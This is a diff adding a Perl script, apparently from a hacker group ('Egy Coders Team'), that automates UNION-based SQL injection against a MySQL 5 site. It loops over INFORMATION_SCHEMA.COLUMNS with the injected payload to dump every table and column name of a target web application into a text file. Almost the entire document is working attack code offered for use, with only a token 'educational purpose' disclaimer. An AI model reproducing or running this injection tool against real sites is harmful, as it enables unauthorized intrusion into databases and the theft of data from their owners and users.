@@ -1,0 +1,78 @@
+#!usr/bin/perl 
+ 
+# Error Code {D0L4} Schema Extractor v 1.0 (PUBLIC) 
+# In MYSQL Version 5 ONLY !! 
+# No best case is written and i removed the else condition so you will have to exit the tool by 
+# yourself if it took a lot of time to extract which indicates that all tables were extracted. 
+# This tool will work in most cases except on some sites because you will need to edit some lines 
+# so that the tool works so perfect but i won't publish it in that version. USE YOUR BRAIN !! 
+# Don't expect from me to write a perfect coding. I meant this to let u develop & think !! 
+# There are some parts are missing but they won't hardly effect, contact me if you want help. 
+ 
+# This was written for educational purpose only. Use it at your own risk. 
+# Author will be not responsible for any damage! 
+# Greetz: Providor - Haxker - ExH - SQL_Inj4ct0r - Kof2002 - Thrid Devil - 5!n4r7x - Dr Hacker - 
+# h666p - Bright DarK - Stealth -The General LoOser - Data-Fr34k3r -and all my friends 
+# Email: e.code@hotmail.com -- www.sec-geeks.com 
+# Date: December 08 
+# N.B: Be Optimistic !! 
+ 
+use LWP::UserAgent; 
+use HTTP::Request; 
+use LWP::Simple; 
+ 
+# Site URL www.site.com/index.php?id=-123 
+$site = "http://www.site.com/ing/criticas.php?id=-1"; 
+# Number of columns in table 
+$cols = 5; 
+# Name of file to save output in 
+$file = "site.com".".txt"; 
+ 
+sub usage { 
+print "##########################################################\n"; 
+print "######## Error Code {D0L4} Schema Extractor v 1.0 ########\n"; 
+print "########       For Egy Coders Team Only !!        ########\n"; 
+print "########       Email:e.code[at]hotmail.com        ########\n"; 
+print "#########################################################\n\n"; 
+} 
+ 
+sub Extract_Tables 
+{ 
+    ($site, $num_columns,$c) = @_; 
+    $column = 1; 
+    for($i=1;$i<=$num_columns;$i++) 
+    { 
+        if($i!=$num_columns){    $columns .= "$column,";    } 
+        else{    $columns .= "$column";    } 
+    } 
+    $concat = "concat(0x3A3A5461626C653A3A,table_name,0x3A3A436F6C756D6E3A3A,column_name,0x3A3A)"; 
+    $columns =~ s/1/$concat/g; 
+    $post_col = $columns; 
+    $schema = $site."+UNION+SELECT+".$post_col."+FROM+INFORMATION_SCHEMA.COLUMNS+LIMIT+"; 
+    open (MYFILE, ">>$c"); 
+    print MYFILE "POC: $site\nNumber of coloums: $cols\n\nSchema:\n"; 
+    close(MYFILE); 
+    print "Tables are :\n"; 
+    for($l=177;$l<50000;$l++) 
+    { 
+        $limit = $l.",1"; 
+        $final = $schema.$limit."--"; # change to /* if tool failed 
+        my $ua = LWP::UserAgent->new; 
+        my $req = HTTP::Request->new(GET => $final); 
+        $doc = $ua->request($req)->as_string; 
+ 
+        if($doc  =~ m/.*?::Table::(.*?)::Column::(.*?)::/) 
+        { 
+            open (MYFILE, ">>$c"); 
+            print("Table: $1 - Column: $2\n"); 
+            print MYFILE "Table: $1 - Column: $2\n"; 
+        } 
+    } 
+    #print "Schema must has been extracted and copied to $c"; 
+} 
+ 
+######################################################### 
+########## MAIN EXECUTION DOWN THERE. DUN EDIT ########## 
+######################################################### 
+&usage; 
+&Extract_Tables($site,$cols,$file);    
